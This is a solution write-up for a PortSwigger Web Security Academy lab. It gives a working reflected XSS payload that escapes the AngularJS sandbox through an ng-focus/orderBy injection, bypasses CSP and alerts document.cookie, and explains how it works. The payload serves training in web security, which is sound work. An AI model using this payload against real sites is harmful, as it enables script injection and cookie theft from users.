# Lab: Reflected XSS with AngularJS sandbox escape and CSP

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.

Access the lab: https://portswigger.net/academy/labs/launch/978febc1996cddc2b7cd48d98a7675b4c51e498017943479c16896589a51c363?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2fclient-side-template-injection%2flab-angular-sandbox-escape-and-csp

## Solution

{% stepper %}
{% step %}
### Prepare exploit on the exploit server

Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

{% code title="exploit.html" %}
```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
{% endcode %}

Click "Store".
{% endstep %}

{% step %}
### Deliver exploit

Click "Deliver exploit to victim".
{% endstep %}
{% endstepper %}

### Explanation

* The exploit leverages an `ng-focus` event in AngularJS to trigger execution in a way that bypasses Content Security Policy.
* `$event` is an AngularJS variable referencing the event object. The `path` (or `composedPath()`) property (Chrome-specific) contains an array of elements involved in the event; the array includes an element that provides access to the `window` scope.
* The `|` operator in AngularJS templates denotes application of a filter; here `orderBy` is used with an argument that assigns `alert` to a variable `z` and calls it with `document.cookie` when the filter reaches the `window` object within `$event.path`, bypassing AngularJS's `window` check.

## Community solutions

<details>

<summary>Michael Sommer â€” Reflected XSS with AngularJS sandbox escape and CSP (Video)</summary>

Reflected XSS with AngularJS sandbox escape and CSP (Video solution, Audio) - YouTube

https://www.youtube.com/watch?v=ezCHiuFRTMA

</details>
